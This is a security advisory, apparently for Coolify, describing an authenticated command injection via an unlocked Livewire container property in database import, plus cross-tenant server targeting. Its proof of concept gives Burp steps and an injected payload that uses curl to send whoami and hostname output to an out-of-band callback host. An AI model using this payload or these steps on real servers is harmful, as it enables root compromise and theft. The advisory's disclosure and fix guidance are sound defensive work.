repo.description: ### Summary An authenticated command injection vulnerability in the Database Import functionality allows users with team membership (lowest privilege role) to execute arbitrary commands as root on managed servers. The `$container` Livewire public property is interpolated directly into shell commands (`docker exec`, `docker cp`) without sanitization, and can be modified by any client via the Livewire wire protocol because it lacks the #[Locked] attribute. This is a bypass of the fix for `GHSA-q33h-22xm-4cgh`, which added `validateServerPath()` to sanitize file path inputs but left the $container parameter completely unvalidated. ### Details #### Vulnerable File: `app/Livewire/Project/Database/Import.php` #### Vulnerable Code (Multiple Locations) Line 138 (unlocked public property): ```php public string $container; // No #[Locked] attribute - client-modifiable ``` Line 435 (upload path): ```php $this->importCommands[] = "docker cp {$tmpPath} {$this->container}:{$tmpPath}"; ``` Line 445 (custom location path): ```php $this->importCommands[] = "docker cp {$escapedCustomLocation} {$this->container}:{$tmpPath}"; ``` Line 460 (script copy): ```php $this->importCommands[] = "docker cp {$scriptPath} {$this->container}:{$scriptPath}"; ``` Line 462 (restore execution): ```php $this->importCommands[] = "docker exec {$this->container} sh -c '{$scriptPath}'"; ``` In Livewire 3, all public properties on a component can be modified by the client through the `updates` field in `POST /livewire/update` requests, unless the property has the `#[Locked]` attribute. The `$container` property lacks this attribute and is interpolated directly into shell commands executed via `remote_process()` on managed servers over SSH. The fix for GHSA-q33h-22xm-4cgh (commit `9113ed714`) added `validateServerPath()` to reject shell metacharacters like `$(`, `;`, `in the` $customLocation `parameter. However, the` $container `parameter was overlooked and has no validation whatsoever. An attacker can inject arbitrary commands using` $()` command substitution. **Contrast with properly secured component:** `app/Livewire/Project/Shared/ExecuteContainerCommand.php` in the same codebase validates container names with regex (`/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/`), verifies against an allowlist of running containers, and checks server ownership. The Import component has none of these protections. **Cross-Tenant Escalation (line 184):** ```php public function server() { return Server::find($this->serverId); // No team scoping } ``` The `$serverId` property also lacks `#[Locked]` and uses `Server::find()` with no team scoping. Server IDs are sequential integers. An attacker can override `serverId` to target servers belonging to other teams while keeping `resourceId`/`resourceType` pointing to their own resource to pass the authorization check on line 410. ### PoC **Prerequisites:** - Coolify v4.0.0-beta.468 or earlier - Authenticated user with team membership (any role, including `member` - the lowest privilege) - At least one database resource accessible to the user - Burp Suite or any HTTP proxy **Steps to reproduce:** 1. Log in as a low-privilege team member and switch to a team that has a database resource. 2. Navigate to the database's Import Backup page (e.g., `/project/{project}/environment/{env}/database/{db}/import-backup`). 3. Select "Restore from File", enter `/etc/hostname` in the custom location field, and click "Restore Database from File". Enter your password in the confirmation dialog. 4. Intercept the resulting `POST /livewire/update` request in Burp Suite. Look for the request containing `"method":"runImport"` and `"name":"project.database.import"`. 5. In Burp Repeater, modify the `updates` object in the JSON body to inject the `container` property: ```json "updates": { "customLocation": "/etc/hostname", "container": "$(curl http://COLLABORATOR_ID.oastify.com/$(whoami)/$(hostname))" } ``` 1. Send the request. The server responds with HTTP 200, `"importRunning":true`, and a non-null `activityId`, confirming the commands were dispatched to the job queue. 2. Burp Collaborator receives an HTTP callback confirming root RCE: ``` GET /root/c7cd43d76693 HTTP/1.1 Host: COLLABORATOR_ID.oastify.com User-Agent: curl/7.88.1 ``` The path `/root/c7cd43d76693` contains the output of `whoami` (root) and `hostname` (c7cd43d76693), confirming arbitrary command execution as root on the managed server. ### Impact **Severity:** Critical (CVSS 9.9) **Impact:** - **Remote Code Execution:** Attackers can execute arbitrary commands on managed servers - **Root Privilege:** All commands execute as root due to Coolify's SSH execution model - **Bypass of Previous Fix:** The patch for GHSA-q33h-22xm-4cgh validated file path inputs but left the container name parameter completely unsanitized - **Cross-Tenant Escalation:** By overriding `serverId`, an attacker can target servers belonging to other teams on the same Coolify instance - **Full Server Compromise:** Access to SSH private keys, database credentials, application secrets, and all data on managed infrastructure - **Lateral Movement:** Coolify stores SSH keys for every connected server, enabling pivot to all managed hosts ### Recommended Fix Add `#[Locked]` to all security-sensitive properties: ```php use Livewire\Attributes\Locked; #[Locked] public string $container; #[Locked] public ?int $serverId = null; ``` Additionally, validate the container name before use in shell commands, consistent with `ExecuteContainerCommand.php`: ```php if (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/', $this->container)) { $this->dispatch('error', 'Invalid container name.'); return true; } ``` Scope server lookups to the current team: ```php return Server::ownedByCurrentTeam()->find($this->serverId); ```
repo.summary: Authenticated Remote Code Execution via Command Injection in Database Import Container Name
